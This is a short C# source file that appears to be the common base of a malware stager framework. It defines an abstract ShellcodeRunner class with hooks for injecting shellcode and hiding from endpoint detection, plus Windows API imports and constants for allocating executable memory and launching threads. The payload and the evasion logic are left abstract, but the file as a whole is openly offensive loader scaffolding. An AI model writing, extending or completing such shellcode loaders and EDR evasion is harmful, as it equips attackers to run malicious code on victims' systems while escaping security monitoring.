using System;
using System.Runtime.InteropServices;
using System.Threading.Tasks;

namespace Stagers.Common;

public abstract class ShellcodeRunner
{
    protected abstract Task InjectShellcode(byte[] shellcode);
    protected abstract Task HideFromEDR();
    
    protected virtual async Task Initialize()
    {
        await HideFromEDR();
    }
    
    protected static class NativeMethods
    {
        [DllImport("kernel32.dll")]
        public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
        
        [DllImport("kernel32.dll")]
        public static extern bool VirtualProtect(IntPtr lpAddress, uint dwSize, uint flNewProtect, out uint lpflOldProtect);
        
        [DllImport("kernel32.dll")]
        public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
        
        [DllImport("kernel32.dll")]
        public static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);
    }
    
    // Memory constants
    protected const uint MEM_COMMIT = 0x1000;
    protected const uint MEM_RESERVE = 0x2000;
    protected const uint PAGE_EXECUTE_READWRITE = 0x40;
    protected const uint PAGE_READWRITE = 0x04;
    
    // Thread constants
    protected const uint INFINITE = 0xFFFFFFFF;
    protected const uint CREATE_SUSPENDED = 0x4;
}
